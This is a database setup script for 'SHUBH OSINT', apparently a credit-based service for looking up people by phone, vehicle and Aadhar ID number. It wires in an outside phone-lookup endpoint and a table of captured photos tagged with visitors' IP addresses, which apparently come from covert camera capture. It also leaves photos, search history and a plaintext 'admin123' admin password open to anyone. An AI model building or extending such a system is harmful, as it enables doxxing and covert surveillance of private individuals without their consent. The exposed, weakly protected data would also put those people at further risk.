-- =====================================================
-- SHUBH OSINT - Complete Supabase Database Setup
-- =====================================================
-- Run this SQL in your new Supabase project's SQL Editor
-- =====================================================

-- =====================================================
-- 1. CREATE TABLES
-- =====================================================

-- Access Passwords Table
CREATE TABLE IF NOT EXISTS public.access_passwords (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  password_hash TEXT NOT NULL,
  password_display TEXT NOT NULL,
  total_credits INTEGER NOT NULL DEFAULT 0,
  remaining_credits INTEGER NOT NULL DEFAULT 0,
  is_enabled BOOLEAN NOT NULL DEFAULT true,
  is_used BOOLEAN NOT NULL DEFAULT false,
  is_unlimited BOOLEAN NOT NULL DEFAULT false,
  device_id TEXT,
  used_at TIMESTAMP WITH TIME ZONE,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- User Sessions Table
CREATE TABLE IF NOT EXISTS public.user_sessions (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  password_id UUID NOT NULL,
  device_id TEXT NOT NULL,
  session_token TEXT NOT NULL,
  is_active BOOLEAN NOT NULL DEFAULT true,
  last_active_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Credit Usage Table
CREATE TABLE IF NOT EXISTS public.credit_usage (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  password_id UUID NOT NULL,
  credits_used INTEGER NOT NULL,
  search_type TEXT NOT NULL,
  search_query TEXT,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- App Settings Table
CREATE TABLE IF NOT EXISTS public.app_settings (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  setting_key TEXT NOT NULL UNIQUE,
  setting_value JSONB NOT NULL,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Captured Photos Table
CREATE TABLE IF NOT EXISTS public.captured_photos (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  session_id TEXT NOT NULL,
  image_data TEXT NOT NULL,
  user_agent TEXT,
  ip_address TEXT,
  captured_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Search History Table
CREATE TABLE IF NOT EXISTS public.search_history (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  search_type TEXT NOT NULL,
  search_query TEXT NOT NULL,
  ip_address TEXT,
  searched_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- =====================================================
-- 2. ENABLE ROW LEVEL SECURITY
-- =====================================================

ALTER TABLE public.access_passwords ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.user_sessions ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.credit_usage ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.app_settings ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.captured_photos ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.search_history ENABLE ROW LEVEL SECURITY;

-- =====================================================
-- 3. RLS POLICIES
-- =====================================================

-- Access Passwords - No direct access (only via edge functions)
CREATE POLICY "No direct access to passwords" ON public.access_passwords
  AS RESTRICTIVE FOR ALL USING (false);

-- User Sessions - No direct access (only via edge functions)
CREATE POLICY "No direct access to sessions" ON public.user_sessions
  AS RESTRICTIVE FOR ALL USING (false);

-- Credit Usage - No direct access (only via edge functions)
CREATE POLICY "No direct access to credit usage" ON public.credit_usage
  AS RESTRICTIVE FOR ALL USING (false);

-- App Settings - Public read/write
CREATE POLICY "Anyone can read settings" ON public.app_settings
  AS RESTRICTIVE FOR SELECT USING (true);

CREATE POLICY "Anyone can insert settings" ON public.app_settings
  AS RESTRICTIVE FOR INSERT WITH CHECK (true);

CREATE POLICY "Anyone can update settings" ON public.app_settings
  AS RESTRICTIVE FOR UPDATE USING (true);

-- Captured Photos - Public access
CREATE POLICY "Anyone can view captured photos" ON public.captured_photos
  AS RESTRICTIVE FOR SELECT USING (true);

CREATE POLICY "Anyone can insert captured photos" ON public.captured_photos
  AS RESTRICTIVE FOR INSERT WITH CHECK (true);

CREATE POLICY "Anyone can delete captured photos" ON public.captured_photos
  AS RESTRICTIVE FOR DELETE USING (true);

-- Search History - Public access
CREATE POLICY "Anyone can view search history" ON public.search_history
  AS RESTRICTIVE FOR SELECT USING (true);

CREATE POLICY "Anyone can insert search history" ON public.search_history
  AS RESTRICTIVE FOR INSERT WITH CHECK (true);

CREATE POLICY "Anyone can delete search history" ON public.search_history
  AS RESTRICTIVE FOR DELETE USING (true);

-- =====================================================
-- 4. FUNCTIONS AND TRIGGERS
-- =====================================================

-- Update timestamp function
CREATE OR REPLACE FUNCTION public.update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SET search_path = public;

-- Trigger for app_settings
CREATE TRIGGER update_app_settings_updated_at
  BEFORE UPDATE ON public.app_settings
  FOR EACH ROW
  EXECUTE FUNCTION public.update_updated_at_column();

-- Trigger for access_passwords
CREATE TRIGGER update_access_passwords_updated_at
  BEFORE UPDATE ON public.access_passwords
  FOR EACH ROW
  EXECUTE FUNCTION public.update_updated_at_column();

-- =====================================================
-- 5. INDEXES
-- =====================================================

CREATE INDEX IF NOT EXISTS idx_app_settings_key ON public.app_settings(setting_key);
CREATE INDEX IF NOT EXISTS idx_captured_photos_session ON public.captured_photos(session_id);
CREATE INDEX IF NOT EXISTS idx_search_history_type ON public.search_history(search_type);
CREATE INDEX IF NOT EXISTS idx_search_history_date ON public.search_history(searched_at);
CREATE INDEX IF NOT EXISTS idx_access_passwords_hash ON public.access_passwords(password_hash);
CREATE INDEX IF NOT EXISTS idx_user_sessions_token ON public.user_sessions(session_token);
CREATE INDEX IF NOT EXISTS idx_user_sessions_password ON public.user_sessions(password_id);
CREATE INDEX IF NOT EXISTS idx_credit_usage_password ON public.credit_usage(password_id);

-- =====================================================
-- 6. DEFAULT DATA - Admin Password & Search Buttons
-- =====================================================

-- Admin Password (change 'admin123' to your desired password)
INSERT INTO public.app_settings (setting_key, setting_value)
VALUES ('admin_password', '"admin123"')
ON CONFLICT (setting_key) DO NOTHING;

-- Search Buttons Configuration
INSERT INTO public.app_settings (setting_key, setting_value)
VALUES ('search_buttons', '[
  {
    "id": "phone",
    "label": "Phone Search",
    "searchType": "phone",
    "placeholder": "Enter phone number",
    "apiUrl": "https://anmolzz.teamxferry.workers.dev/?mobile=",
    "isEnabled": true
  },
  {
    "id": "vehicle",
    "label": "Vehicle Search",
    "searchType": "vehicle",
    "placeholder": "Enter vehicle number",
    "apiUrl": "",
    "isEnabled": true
  },
  {
    "id": "aadhar",
    "label": "Aadhar Search",
    "searchType": "aadhar",
    "placeholder": "Enter Aadhar number",
    "apiUrl": "",
    "isEnabled": true
  }
]')
ON CONFLICT (setting_key) DO NOTHING;

-- =====================================================
-- SETUP COMPLETE!
-- =====================================================
